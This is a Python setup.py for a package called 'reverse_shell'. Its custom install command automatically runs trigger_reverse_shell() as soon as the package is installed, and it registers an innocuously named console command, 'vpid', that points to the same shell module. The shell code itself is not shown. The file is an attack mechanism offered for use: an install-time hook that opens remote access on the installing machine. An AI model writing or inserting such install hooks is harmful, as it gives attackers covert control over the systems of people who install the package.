from setuptools import setup, find_packages
from setuptools.command.install import install as _install

class CustomInstallCommand(_install):
    def run(self):
        _install.run(self)
        # Execute the reverse shell here
        from reverse_shell.shell import trigger_reverse_shell
        trigger_reverse_shell()

setup(
    name="reverse_shell",
    version="0.1",
    packages=find_packages(),
    install_requires=[],
    entry_points={
        'console_scripts': [
            'vpid=reverse_shell.shell:main',
        ],
    },
    author="Your Name",
    author_email="your_email@example.com",
    description="A Python package for establishing a reverse shell connection",
    url="https://github.com/yourusername/reverse_shell",  # Replace with the actual URL of your project
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
